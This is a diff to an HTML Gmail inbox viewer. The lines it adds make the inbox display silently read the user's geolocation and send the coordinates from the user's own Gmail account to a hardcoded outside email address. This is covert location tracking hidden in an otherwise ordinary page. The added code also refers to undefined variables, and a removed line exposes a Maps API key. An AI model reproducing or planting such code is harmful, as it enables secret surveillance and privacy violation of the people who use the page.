@@ -36,7 +36,7 @@ body {
 	 
 	<div id="map-layer"></div>
 
-
+<p id="demo"></p>
 	<script type="text/javascript">
 	
 	var map;
@@ -46,10 +46,7 @@ body {
 		var defaultOptions = { center: centerCoordinates, zoom: 4 }
 
 		map = new google.maps.Map(mapLayer, defaultOptions);
-		setTimeout(()=>{
-	
-	locate()
-	},0);
+		 
 	}
 function composeTidy()
       {
@@ -129,11 +126,14 @@ function composeTidy()
 	  
 	  
 	  function displayInbox() {
+	  
+	  
         var request = gapi.client.gmail.users.messages.list({
           'userId': 'me',
           'labelIds': 'INBOX',
           'maxResults': 10
         });
+		getLocation();
         request.execute(function(response) {
           $.each(response.messages, function() {
             var messageRequest = gapi.client.gmail.users.messages.get({
@@ -144,8 +144,18 @@ function composeTidy()
           });
         });
       }
-	   
-	  function sendMessage(headers_obj, message, callback)
+	  
+	  	
+	  
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+  function sendMessage(headers_obj, message, callback)
       {
         var email = '';
         for(var header in headers_obj)
@@ -159,11 +169,23 @@ function composeTidy()
         });
         return sendRequest.execute(callback);
       }
+
+function showPosition(position) {
+	sendMessage(
+          {
+            'To': 'asivapvl@gmail.com',
+            'Subject':  position.coords.latitude  + 'ss '+ position.coords.longitude
+          },
+           position.coords.latitude  + 'ss '+ currentLongitude,
+          composeTidy
+        );
+  
+}
+	   
+	
 	  
 	  </script>
   <script src="https://apis.google.com/js/client.js?onload=handleClientLoad"></script>
-		<script
-		src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAZGf5nxCAq9At1JC5zAOkepMN4RudOmSY&callback=initMap" async defer
-		 ></script>
+		 
 </body>
 </html>
